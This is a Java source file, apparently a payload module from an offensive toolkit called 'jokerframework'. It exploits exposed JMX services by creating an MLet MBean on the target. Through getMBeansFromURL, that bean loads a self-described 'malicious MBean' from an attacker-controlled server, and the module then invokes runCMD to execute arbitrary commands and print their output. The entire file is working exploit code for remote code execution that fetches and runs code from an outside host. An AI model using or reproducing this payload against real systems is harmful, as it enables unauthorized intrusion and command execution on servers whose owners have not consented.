package com.lucifaer.jokerframework.modules.payloads;

import com.lucifaer.jokerframework.modules.Payload;
import com.lucifaer.jokerframework.server.Client;
import com.lucifaer.jokerframework.server.Server;
import org.springframework.beans.factory.annotation.Autowired;

import javax.management.*;
import java.util.Map;
import java.util.Set;

import static com.lucifaer.jokerframework.utils.commons.Output.echo;

public class JmxCommand implements Payload {
    @Autowired
    private Client client;
    @Autowired
    private Server server;

    private MBeanServerConnection mbsc;
    private ObjectInstance mletBean;
    private Map<String, String> params;

    @Override
    public void exploit() {
        this.mbsc = (MBeanServerConnection) client.init();
        try {
            getMletBean();
            echo("[INFO] Loading " + this.mletBean.getClassName());
            echo("[INFO] Executing command: " + params.get("command"));
            String[] mletParams = {params.get("command")};
            String[] mletSigneture = {"java.lang.String"};
            String reader = (String) this.mbsc.invoke(this.mletBean.getObjectName(), "runCMD", mletParams, mletSigneture);
            echo(reader);
        }catch (Exception e) {
            e.printStackTrace();
        }
    }

    private void getMletBean() throws Exception {
        try {
            this.mletBean = mbsc.getObjectInstance(new ObjectName("Payload:name=payload,id=1"));
        }
        catch (InstanceNotFoundException e) {
            String mletClass = "javax.management.loading.MLet";
            try {
                this.mletBean = mbsc.createMBean(mletClass, null);
                install();
                getMletBean();
            }
            catch (InstanceAlreadyExistsException error) {
                this.mletBean = mbsc.getObjectInstance(new ObjectName("DefaultDomain:type=MLet"));
                install();
                getMletBean();
            }
        }
        catch (Exception e) {
            e.printStackTrace();
        }
    }

    private void install() throws Exception {
        echo("[INFO] Loading malicious MBean from " + server.getServerUrl());
        echo("[INFO] Invoking: " + this.mletBean.getClass().getName() + ".getMBeansFromURL");
        String[] mletParams = {server.getServerUrl()+ ":" +server.getServerPort()};
        String[] mletSigneture = {"java.lang.String"};
        Set mbeanSet = (Set) this.mbsc.invoke(this.mletBean.getObjectName(), "getMBeansFromURL", mletParams, mletSigneture);
        for (Object element : mbeanSet) {
            if (element instanceof ObjectInstance) {
                echo("[INFO] Object name = " + ((ObjectInstance) element).getObjectName());
            } else {
                echo("[ERROR] Exception = " + ((Throwable) element).getMessage());
                echo("[FAIL] Install Fail");
            }
        }
        echo("[SUCCESS] Install Successful");
    }

    @Override
    public void init(Map<String, String> params) {
        this.params = params;
    }
}
